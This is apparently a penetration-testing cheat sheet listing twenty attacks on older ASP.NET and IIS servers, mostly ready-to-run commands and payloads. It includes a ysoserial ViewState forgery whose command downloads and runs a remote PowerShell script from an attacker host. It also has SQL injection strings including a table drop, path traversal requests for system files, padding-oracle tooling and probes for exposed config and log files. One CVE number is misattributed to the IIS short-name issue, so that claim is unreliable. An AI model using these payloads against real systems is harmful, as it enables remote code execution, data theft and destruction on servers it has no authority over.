# Old ASP.NET Vulnerabilities

## 1. ViewState Deserialization
```bash
# Extract ViewState from page
# Decode and deserialize
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --validationkey="..." --validationalgorithm="SHA1"
```

## 2. SQL Injection in ASP.NET
```sql
-- Classic ASP
' UNION SELECT username,password FROM users--
-- ASP.NET WebForms
' OR '1'='1
```

## 3. Directory Traversal
```
GET /..\..\..\..\windows\win.ini
GET /..%5c..%5c..%5c..%5cwindows%5cwin.ini
GET /%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

## 4. web.config Exposure
```
/web.config
/WEB.CONFIG
/Bin/web.config
```

## 5. Trace.axd Information Disclosure
```
/trace.axd
/Trace.axd
# Shows request details, server variables
```

## 6. elmah.axd Error Log
```
/elmah.axd
/elmah.axd/rss
# Exposes error logs with sensitive info
```

## 7. ScriptResource.axd
```
/ScriptResource.axd?d=...
# May expose source code
```

## 8. WebResource.axd
```
/WebResource.axd?d=...
# May expose resources
```

## 9. Machine Key Extraction
```bash
# If machineKey is known
# Forge ViewState for RCE
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')" --validationkey="..." --validationalgorithm="HMACSHA256"
```

## 10. SQL Stored Procedure Injection
```sql
EXEC sp_executesql N'SELECT * FROM users WHERE id=@id', N'@id int', @id=1; DROP TABLE users--
```

## 11. Session Fixation
```
# Fix ASP.NET_SessionId
Set-Cookie: ASP.NET_SessionId=attacker_session
```

## 12. Padding Oracle (CVE-2010-3332)
```bash
# ASP.NET padding oracle
padBuster http://target/encrypted.txt EncryptedValue 16
# Decrypt
padBuster http://target/encrypted.txt EncryptedValue 16 -decrypt
# Encrypt (forge)
padBuster http://target/encrypted.txt EncryptedValue 16 -encrypt
```

## 13. XXE in .NET < 4.5.2
```csharp
XmlDocument doc = new XmlDocument();
doc.LoadXml(userInput); // Vulnerable
// .NET < 4.5.2 has DTD processing enabled by default
```

## 14. Debug Mode
```
# Check web.config for compilation debug="true"
/web.config
```

## 15. CustomErrors Bypass
```
# If CustomErrors mode="RemoteOnly"
# Access from localhost shows detailed errors
# Or trigger 500 error to see stack trace
```

## 16. ASP.NET Identity Bypass
```bash
# Default machineKey in older versions
# Known validationKey/decryptionKey
```

## 17. HTTP.SYS (CVE-2015-1635)
```bash
# IIS 7.5-8.5 RCE
curl -sk "http://target/" -H "Range: bytes=0-18446744073709551615"
```

## 18. IIS Short Name (CVE-2017-8464)
```bash
# Enumerate short filenames
curl -sk "http://target/*~1*/.aspx" -o /dev/null -w "%{http_code}"
```

## 19. ASP.NET Session Token Predictability
```bash
# Older ASP.NET session tokens may be predictable
```

## 20. Template Injection (Razor)
```cshtml
@Html.Raw(userInput)
@Html.Raw(Model.Content)
// XSS via Razor
```

## Detection
```bash
# Check for ASP.NET
curl -sk "http://target/" -I | grep -i "X-Powered-By: ASP.NET"
curl -sk "http://target/" -I | grep -i "X-AspNet-Version"
# Check common files
curl -sk "http://target/web.config"
curl -sk "http://target/trace.axd"
curl -sk "http://target/elmah.axd"
```
